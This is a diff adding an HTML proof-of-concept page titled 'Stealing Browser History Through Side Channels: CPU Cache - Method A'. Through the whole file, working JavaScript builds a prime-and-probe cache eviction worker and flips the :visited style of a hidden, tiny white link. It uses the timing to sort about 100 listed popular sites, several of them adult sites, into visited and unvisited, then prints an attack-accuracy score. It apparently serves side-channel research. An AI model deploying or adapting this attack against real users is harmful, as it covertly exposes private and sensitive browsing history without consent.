@@ -1,0 +1,433 @@
+<html>
+	<head>
+		<style>
+			.attack {
+				font-size: 2px;
+				color: white;
+			}
+			.attack:visited  { color: #feffff; }
+		</style>
+	</head>
+	<body>
+		<table id="tbl-params">
+			<tr>
+				<td colspan="2" style="border-bottom: 1px dashed;text-align: center">
+					<b>Stealing Browser History Through Side Channels: CPU Cache - Method A</b>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					Text Length: <input id="textLength" dir="rtl" size="1" value=38 onKeyUp=resizeText()></input>(K) Characters
+				</br>
+					Cache Sets: <input id="csets" dir="rtl" size="1" value=4096 onKeyUp=resizeSets()></input> Cache Ways: <input id="cways" dir="rtl" size="1" value=16 onKeyUp=resizeWays()></input>
+				</td>
+				<td>
+					<button id="run" onclick="init()">RUN</button>
+				</td>
+			</tr>
+		</table>
+
+		<a id="a0" class="attack"></a>
+
+		<div id="res"></div>
+		<div id="visited-div"></div>
+		<div id="unvisited-div"></div>
+		
+		<script>
+			// variables and constants
+			const COUNT_SWEEPS = true;
+			var CACHE_SETS = 4096; var CACHE_WAYS = 16;
+			var MEASUREMENT_TIME_IN_MS = 2500;
+			var SAMPLING_PERIOD_IN_MS = MEASUREMENT_TIME_IN_MS;
+			const SET_SKIPPING_STEP = 2;
+	
+			// Worker thread message type constants
+			const CREATE_PP_OBJECT = 1, PROBE_ALL_SETS = 2, PERFORM_MEASUREMENT = 3, DELETE_PP_OBJECT = 4;
+		</script>
+
+		<script id="cacheWorkerSource" <!-- -->type = "javascript/worker" >
+			// worker constants
+			0; // otherwise VSCode complains...
+			const BYTES_PER_MB = 1024*1024;
+			const SETS_PER_PAGE = 64;
+			
+			// Worker thread message type constants
+			//const CREATE_PP_OBJECT = 1, PROBE_ALL_SETS = 2, PERFORM_MEASUREMENT = 3;
+			
+			// Prime and probe object
+			function PrimeProbe(sets, ways) {
+				this.evictionArray = new Uint32Array(32 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT);
+				this.setHeads = new Array(SETS_PER_PAGE);
+			
+				this.probeSet = function (setOffset) {
+					// Go over all elements in the set
+					var pointer = this.setHeads[setOffset];
+					var listHead = pointer;
+					do {
+						pointer = this.evictionArray[pointer];
+					} while (pointer != listHead);
+					return pointer;
+				}
+		   
+				this.probeSetLimited = function (setOffset, hops) {
+					// Go over all elements in the set
+					var pointer = this.setHeads[setOffset];
+					var listHead = pointer;
+					do {
+						pointer = this.evictionArray[pointer];
+						hops--;
+					} while ((hops != 0) && (pointer != listHead));
+					return pointer;
+				}
+			
+				this.probeSets = function (sets) {
+					// Probe some of the sets in the page
+					for (setOffset in sets) {
+						this.probeSet(sets[setOffset]);
+					}
+				}
+			
+				this.probeAllSets = function(setSkippingStep) {
+					for (var set=0;set < SETS_PER_PAGE; set += setSkippingStep) {
+						this.probeSet(set);
+					}
+				}
+	
+				this.shuffle = function (arrayToShuffle) {
+					var tmp, current, top = arrayToShuffle.length;
+					if (top) while (--top) {
+						current = Math.floor(Math.random() * (top + 1));
+						tmp = arrayToShuffle[current];
+						arrayToShuffle[current] = arrayToShuffle[top];
+						arrayToShuffle[top] = tmp;
+					}
+					return arrayToShuffle;
+				}
+	
+				this.createSetHeads = function (sets, ways) {
+					// We have 64 set heads, each should to a list of size 128*[ways]=1536
+					var unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE);
+					var allSetOffset = Math.log2(sets) + 4; // 17 for sets=8192, 16 for sets=4096
+					var i;
+					for (i = 0; i < unshuffledArray.length; i++) {
+						unshuffledArray[i] = i;
+					}
+					
+					// Shuffle the array
+					var shuffledArray = this.shuffle(unshuffledArray);
+					
+					// Now write into the eviction buffer
+					
+					// virtual address is:
+	
+					// LLL LEEE EEEE SSSS SS00 00[00] (last 2 bits are because of UINT32 vs BYTE)
+	
+					//               ^^^^ ^^ - these 6 bits determine the set index, 64 possible values
+	
+					//               ^^^^ ^^^^ ^^ ^^ - these 12 bits (4K) are the same in physical and in virtual
+	
+					//      ^^^ ^^^^ we keep the set and change these 6/7 bits to 64/128 different values to cover all 8192=128*64 sets
+	
+					// ^^^ ^  - we use 12/16 different values for this to touch each set 12/16 times, once per line
+	
+					var set_index, element_index, line_index;
+					var currentElement, nextElement;
+					for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {
+						currentElement = (shuffledArray[0] << 10) + (set_index << 4);
+						this.setHeads[set_index] = currentElement;
+						for (line_index = 0; line_index < ways; line_index++) {
+							//currentElement = (line_index << 17) + (shuffledArray[0] << 10) + (set_index << 4);
+							for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) {
+								nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
+								this.evictionArray[currentElement] = nextElement;
+								currentElement = nextElement;
+							} // element
+							
+							if (line_index == ways - 1) {
+								// In the last line, the last pointer goes to the head of the entire set
+								nextElement = this.setHeads[set_index];
+							} else {
+								// Last pointer goes back to the head of the next line
+								nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
+							}
+	
+							this.evictionArray[currentElement] = nextElement;
+	
+							currentElement = nextElement;
+						} // line
+					} // set
+				};
+	
+				this.createSetHeads(sets, ways);
+	
+				// check that this doesn't crash/get stuck
+	
+				this.probeSets([1, 2, 3, 4, 5]);
+				
+			} // PP object.
+	
+			PP = {}; // new PrimeProbe(CACHE_SETS, CACHE_WAYS);
+	
+			var resultArray = {}; // new Array (Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS));
+	
+			function performMeasurement(setSkippingStep, countSweeps, measurementTime, bufff) {
+				var [bufff2] = bufff;
+				var buff = new Uint32Array(bufff2);
+	
+				// For each measurement period
+				var busySpins = 0;
+				var currentTime = performance.now();
+				var duration = currentTime + measurementTime;
+	
+				if (countSweeps == true) {
+					do {
+						PP.probeAllSets(setSkippingStep);
+						buff[0]++;
+						currentTime = performance.now();
+					} while (currentTime < duration);
+				}
+			}
+			
+			// Sampling:
+			onmessage = function (e) {
+	
+				// Demultiplex the message from the main thread.
+				switch (e.data.type) {
+					case 1:
+						PP = new PrimeProbe(e.data.sets, e.data.ways);
+						break;
+	
+					case 2:
+						var startTime = performance.now(); 
+						PP.probeAllSets();
+						result.time = performance.now() - startTime;
+						postMessage(result);
+						break;
+					case 3:
+						performMeasurement(
+							e.data.set_skipping_step, 
+							e.data.count_sweeps,
+							e.data.measurement_time,
+							e.data.buff
+						);
+						postMessage(resultArray);
+						break;
+										
+					case 4:
+					PP.evictionArray = null;
+					PP = null;
+					self.close();
+	
+				} // switch
+			} // onmessage
+		</script>
+		
+		<script>
+			const num_of_attempts = 10;
+			const BASE_TEXT = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+			requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+
+			var visited_urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/"];
+			var unvisited_urls = ["https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/" , "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
+			var urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/", "https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/", "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
+
+			var bufferSharedArray = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT); var sharedVariable = new Uint32Array(bufferSharedArray);
+			var myWorker, targetNode, paramsTable, phase, visited_flag, swap, attempt_number, url_index;
+			var med_visited, med_unvisited;
+			var time_base, time_calibrate, time_test;
+			var measurement_values = [], measure_sweeps = [];
+
+			function arbitraryLengthText(inputText, requestedLength) {
+				let outputString = inputText;
+				while (outputString.length < requestedLength) {
+					outputString += outputString;
+				}
+				return outputString.substring(0, requestedLength);
+			}
+
+			// https://stackoverflow.com/questions/2450954/how-to-randomize-shuffle-a-javascript-array
+			function shuffle(array) {
+				let currentIndex = array.length,  randomIndex;
+				while (currentIndex != 0) {
+					randomIndex = Math.floor(Math.random() * currentIndex);
+					currentIndex--;
+					[array[currentIndex], array[randomIndex]] = [
+					array[randomIndex], array[currentIndex]];
+				}
+				return array;
+			}
+
+			function median(arr) {
+
+				arr = arr.sort(function (a, b) { return a - b });
+		
+				var length = arr.length;
+		
+				if (length % 2 == 1) {
+					return arr[(length / 2) - .5]
+				}
+				else {	
+					return (arr[length / 2] + arr[(length / 2) - 1]) / 2;
+				}
+			}
+
+			function resizeSets() { CACHE_SETS = parseInt(document.getElementById("csets").value); }
+
+			function resizeWays() { CACHE_WAYS = parseInt(document.getElementById("cways").value); }
+
+			function handleMessageFromWorker(msg) {
+				if(phase == "calibrate") {
+					report_base();
+				} else if(phase == "test") {
+					report_test();
+				}
+			}
+
+			function CPUPrep() {
+				let blob = new Blob([
+					document.querySelector('#cacheWorkerSource').textContent
+				], { type: "text/javascript" })
+				myWorker = new Worker(window.URL.createObjectURL(blob));
+				myWorker.addEventListener('message', handleMessageFromWorker);
+				myWorker.postMessage({type:CREATE_PP_OBJECT, sets: CACHE_SETS, ways: CACHE_WAYS});
+			}
+
+			function CPUGo(tt) {
+				sharedVariable[0] = 0;
+				myWorker.postMessage({type:PERFORM_MEASUREMENT, measurement_time : tt, set_skipping_step : SET_SKIPPING_STEP, count_sweeps: COUNT_SWEEPS, buff: [bufferSharedArray]});
+			}
+
+			function CPUStop() { myWorker.postMessage({type:DELETE_PP_OBJECT}); }
+			
+			function resizeText() { document.getElementById('a0').innerText = arbitraryLengthText(BASE_TEXT, Math.pow(2,10)*parseInt(document.getElementById("textLength").value)); }
+
+			function init() {
+				sharedVariable[0] = 0;
+				document.getElementById("res").innerText = '';
+				document.getElementById("visited-div").innerHTML = '';
+				document.getElementById("unvisited-div").innerHTML = '';
+				//resizeSets(); resizeWays();
+				CPUPrep();
+				resizeText(); shuffle(urls);
+				targetNode = document.getElementById('a0'); paramsTable = document.getElementById('tbl-params');
+				go_base();
+			}
+
+			function go_base() {
+				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				phase = "calibrate", swap = false, attempt_number = 0, visited_flag = true, measurement_values = [];
+				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				CPUGo(2000);
+				time_base = performance.now();
+				requestAnimationFrame(onAnimateBase);
+			}
+
+			function onAnimateBase() {
+				if(visited_flag && attempt_number == num_of_attempts) visited_flag = false;
+				if(attempt_number == (num_of_attempts*2)) {
+					measurement_values[attempt_number] = sharedVariable[0];
+					time_calibrate = (performance.now() - time_base).toFixed(3);
+					return;
+				}
+				if(swap) {
+					swap = false;
+					targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				} else {
+					swap = true;
+					if(visited_flag) {
+						targetNode.href = location.href; targetNode.style.color = 'white'; targetNode.style.color = '';
+					} else {
+						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+					}
+					measurement_values[attempt_number] = sharedVariable[0]; attempt_number++;
+				}
+				requestAnimationFrame(onAnimateBase);
+			}
+
+			function report_base() {
+				phase = "finished_calibrate!";
+				
+				measure_sweeps = [];
+				for(let i = 0; i < num_of_attempts; i++) {
+					measure_sweeps[i] = measurement_values[i+1] - measurement_values[i];
+				}
+				med_visited = median(measure_sweeps);
+				
+				measure_sweeps = [];
+				for(let i = num_of_attempts; i < (num_of_attempts*2); i++) {
+					measure_sweeps[i-num_of_attempts] = measurement_values[i+1] - measurement_values[i];
+				}
+				med_unvisited = median(measure_sweeps);
+				
+				go_test();
+			}
+
+			function go_test() {
+				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				phase = "test"; swap = false; url_index = 0; measurement_values = [];
+				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				CPUGo(5000);
+				time_base = performance.now();
+				requestAnimationFrame(onAnimateTest);
+			}
+
+			function onAnimateTest() {
+				if(url_index < 100) {
+					if(swap) {
+						swap = false;
+						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+					} else {
+						swap = true;
+						targetNode.href = urls[url_index]; targetNode.style.color = 'white'; targetNode.style.color = '';
+						measurement_values[url_index] = sharedVariable[0]; url_index++;
+					}
+					requestAnimationFrame(onAnimateTest);
+				} else {
+					measurement_values[url_index] = sharedVariable[0];
+					time_test = (performance.now() - time_base).toFixed(3);
+					return;
+				}
+			}
+
+			function report_test() {
+				phase = "finished!";
+				targetNode.style.display = 'none'; paramsTable.style.display = "inline";
+				document.getElementById("res").style.color = 'black'; document.getElementById("res").style.font = "10px";
+				document.getElementById("visited-div").innerHTML = '</br><b>Visited URLs:</b></br>';
+				document.getElementById("unvisited-div").innerHTML = '</br><b>Unvisited URLs:</b></br>';
+
+				let true_count_visited = 0, true_count_unvisited = 0;
+				let states = [], sweeps = [];
+				let curr_idx, curr_trace;
+				for(curr_idx = 0; curr_idx < 100; curr_idx++) {
+
+					curr_trace = measurement_values[curr_idx+1] - measurement_values[curr_idx];
+
+					if(Math.abs(curr_trace - med_visited) < Math.abs(curr_trace - med_unvisited)) {
+						document.getElementById("visited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						if(visited_urls.indexOf(urls[curr_idx]) > -1) true_count_visited++;
+					} else {
+						document.getElementById("unvisited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						if(unvisited_urls.indexOf(urls[curr_idx]) > -1) true_count_unvisited++;
+					}
+					states[curr_idx] = visited_urls.indexOf(urls[curr_idx]) > -1 ? 1 : 0;
+					sweeps[curr_idx] = curr_trace;
+				}
+				
+				let resultNode = document.getElementById("res");
+				resultNode.innerText += "\n Visited Median: " + med_visited;
+				resultNode.innerText += "\n Unvisited Median: " + med_unvisited;
+				resultNode.innerText += "\n Visited (TP): " + true_count_visited;
+				resultNode.innerText += "\n Unvisited (TN): " + true_count_unvisited;
+				//resultNode.innerText += "\n # of tested URLs: " + urls.length;
+				resultNode.innerText += "\n Attack Accuracy: " + (((true_count_visited + true_count_unvisited)/(visited_urls.length+unvisited_urls.length))*100).toFixed(0)+'%';
+				resultNode.innerText += "\n Calibration Time : " + (time_calibrate/1000).toFixed(3) + "s";
+				resultNode.innerText += "\n Test Time : " + (time_test/1000).toFixed(3) + "s";
+				resultNode.innerText += "\n state: " + states;
+				resultNode.innerText += "\n sweeps: " + sweeps;
+
+				CPUStop();
+			}
+		</script>
+	</body>
+</html>
